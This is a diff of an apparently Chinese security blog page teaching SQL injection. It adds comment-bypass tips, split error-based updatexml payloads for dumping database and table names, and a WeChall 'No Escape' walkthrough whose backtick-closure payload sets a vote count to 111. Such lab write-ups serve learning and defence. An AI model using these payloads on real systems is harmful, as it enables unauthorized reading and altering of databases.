@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入 #\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突 /**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字 LIKE语句和转义字符 LIKE语句 再MySQL中LIKE语句用于模糊查询，其基本格式就是\n">
-<title>1.22 sql注入进阶</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入\n#\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突\n/**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字\n">
+<title>1.22 SQL注入系列-2</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/'>
 
-<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.22 sql注入进阶">
-<meta property='og:description' content="前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入 #\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突 /**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字 LIKE语句和转义字符 LIKE语句 再MySQL中LIKE语句用于模糊查询，其基本格式就是\n">
-<meta property='og:url' content='https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/'>
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.22 SQL注入系列-2">
+<meta property='og:description' content="前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入\n#\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突\n/**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/'>
 <meta property='og:site_name' content='Retr0的小窝'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-22T20:58:00&#43;08:00'/><meta property='article:modified_time' content='2026-01-22T20:58:00&#43;08:00'/>
-<meta name="twitter:title" content="1.22 sql注入进阶">
-<meta name="twitter:description" content="前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入 #\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突 /**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字 LIKE语句和转义字符 LIKE语句 再MySQL中LIKE语句用于模糊查询，其基本格式就是\n">
+<meta name="twitter:title" content="1.22 SQL注入系列-2">
+<meta name="twitter:description" content="前置知识 注释符 --+\t(推荐使用)在GET请求中，+ 会被解析为空格，常用于URL注入\n#\t(需URL编码)在GET请求中需编码为 %23，避免与前端锚点冲突\n/**/\t(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -359,6 +359,7 @@
       <ol>
         <li><a href="#第一关">第一关</a></li>
         <li><a href="#第二关">第二关</a></li>
+        <li><a href="#第三关">第三关</a></li>
       </ol>
     </li>
   </ol>
@@ -411,7 +412,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/1.22-sql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/">1.22 sql注入进阶</a>
+            <a href="/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/">1.22 SQL注入系列-2</a>
         </h2>
     
         
@@ -459,9 +460,16 @@
     <h1 id="前置知识">前置知识
 </h1><h2 id="注释符">注释符
 </h2><ol>
-<li><code>--+</code>	(推荐使用)在GET请求中，<code>+</code> 会被解析为空格，常用于URL注入</li>
-<li><code>#</code>		(需URL编码)在GET请求中需编码为 <code>%23</code>，避免与前端锚点冲突</li>
-<li><code>/**/</code>	(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字</li>
+<li>
+<p><code>--+</code>	(推荐使用)在GET请求中，<code>+</code> 会被解析为空格，常用于URL注入</p>
+</li>
+<li>
+<p><code>#</code>		(需URL编码)在GET请求中需编码为 <code>%23</code>，避免与前端锚点冲突</p>
+</li>
+<li>
+<p><code>/**/</code>	(多行注释)用于绕过空格过滤，可代替空格分隔SQL关键字</p>
+<p>在实践，当上面的注释符不可用时，还可以尝试<code>%00</code>或闭合的形式绕过</p>
+</li>
 </ol>
 <h2 id="like语句和转义字符">LIKE语句和转义字符
 </h2><h3 id="like语句">LIKE语句
@@ -646,13 +654,22 @@
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>爆当前数据库名及表名：</strong></p>
+</div><p><strong>爆当前数据库名：</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>爆当前库中表名：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>爆表字段信息：</strong></p>
@@ -1011,7 +1028,41 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>前面加<code>-</code>是为了引起报错，从而让后面的<code>union select</code>得以覆盖报错位。此外，使用<code>or 1=2</code>永假条件也可以强制报错。</p>
-<h1 id="http-头注盲注详解">HTTP 头注盲注详解
+<h3 id="第三关">第三关
+</h3><p>访问：<a class="link" href="https://www.wechall.net/challenge/no_escape/index.php"  target="_blank" rel="noopener"
+    >[WeChall] No Escape</a>，我们的任务是修改任意一个候选人的票数为111，且程序提到票数达到100时会重制，所以靠手点肯定是不行的。</p>
+<p>任意点击投票按钮发现网址后会跟着一个参数<code>?vote_for=xxx</code></p>
+<p><strong>查看源码(核心)：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="err">$</span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1&#34;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到是传入参数后用uodate函数将对应的值+1</p>
+<p>已知句中第二个<code>$who</code>是我们传入的参数值，现在我们要使用闭合（注意原题使用反引号`闭合）加注释的方法在这一行进行注入。</p>
+<p><img src="https://free.picui.cn/free/2026/01/23/69731cfde3cb1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260123150301098"
+	
+	
+></p>
+<p>上面的划线部分就是我们传入的参数，删除线部分是被注释掉的部分，从整个语句来看，该参数成功做到了将wagenk项对应的值修改为111，并且注释了后面原本的内容。所以此外还要注意POST数据的编码转换，所以最后的payload就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">vote_for</span><span class="o">=</span><span class="n">wagenk</span><span class="o">`=</span><span class="mi">111</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">23</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="http-头注盲注详解">HTTP 头注盲注详解
 </h1><h2 id="基本概念">基本概念
 </h2><blockquote>
 <p><strong>HTTP 头注盲注</strong>（HTTP Header Blind SQL Injection）是一种特殊的 SQL 注入攻击，攻击者通过篡改 HTTP 请求头部字段（如 User-Agent、Referer、Cookie、X-Forwarded-For 等），将恶意 SQL 代码注入到后端数据库查询中，同时由于应用程序不返回数据库错误信息或查询结果，只能通过页面响应差异（布尔值）或时间延迟来判断注入结果，从而逐位提取敏感数据的攻击方式。</p>
@@ -1250,6 +1301,19 @@
             
                 
 <article class="">
+    <a href="/p/1.23-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.23 SQL注入系列-3</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/1.22.sp-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/">
         
         
@@ -1295,19 +1359,6 @@
 
         <div class="article-details">
             <h2 class="article-title">1.18 XSS注入攻击</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/1.17-%E9%A1%B5%E6%B8%B8%E4%BD%9C%E5%BC%8A%E5%92%8C%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">1.17 页游作弊和信息搜集</h2>
         </div>
     </a>
 </article>
@@ -1598,8 +1649,12 @@
         
             
         
-        发表了98篇文章 · 
-        总计139.78k字
+            
+        
+            
+        
+        发表了100篇文章 · 
+        总计142.78k字
     </section>
 
 
